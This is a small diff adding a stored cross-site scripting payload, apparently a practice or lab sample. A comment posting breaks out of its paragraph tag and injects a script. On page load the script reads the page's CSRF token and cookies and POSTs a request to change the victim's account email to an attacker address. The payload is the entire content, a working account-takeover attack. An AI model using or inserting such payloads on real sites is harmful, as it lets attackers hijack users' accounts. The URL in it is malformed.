@@ -1,0 +1,13 @@
+<!--XSS that takes advantage of a csrf token on the page to do an CSRF attack-->
+
+Hey checkout my comment!</p>
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    fetch("http:coolwebstie.com/my-account/change-email", {
+        method: "POST", 
+        headers: {
+            "Cookie": document.cookie, 
+            "Content-Type": "application/x-www-form-urlencoded"}, 
+        body: "email=evilhacker24%40yahoo.gov&csrf=" + document.getElementsByName("csrf")[0].value});
+    });
+</script>
